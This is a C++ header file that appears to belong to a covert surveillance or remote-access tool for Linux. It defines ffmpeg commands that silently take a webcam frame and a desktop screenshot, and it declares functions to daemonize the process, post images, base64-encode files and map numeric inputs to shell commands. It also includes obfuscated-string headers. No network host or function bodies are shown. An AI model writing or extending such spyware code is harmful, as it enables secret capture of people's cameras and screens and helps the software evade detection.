#ifndef UTILITY_H
#define UTILITY_H

#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <cstdint>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>

#include "deobfuscate.h"
#include "strings.obf.h"
#include "web.h"

const std::string command_webcam =
    "ffmpeg -f video4linux2 -s 640x480 -i /dev/video0 -ss 0:0:2 -frames 1 "
    "/tmp/out.jpg";
const std::string command_screenshot =
    "ffmpeg -f x11grab -framerate 1 -video_size $(xrandr -q | awk -F'current' "
    "-F',' 'NR==1 {gsub(\"( |current)\",\"\");print $2}') -i :0.0 -vframes 1 "
    "/tmp/out.jpg";
const std::string command_eject = "eject";
const std::string command_open = "xdg-open";

void execute(const std::string &command);
void daemonize();
void postImage();
std::string getHandle();
std::string commandMap(int input);
std::string base64_encode(std::string filepath);

#endif
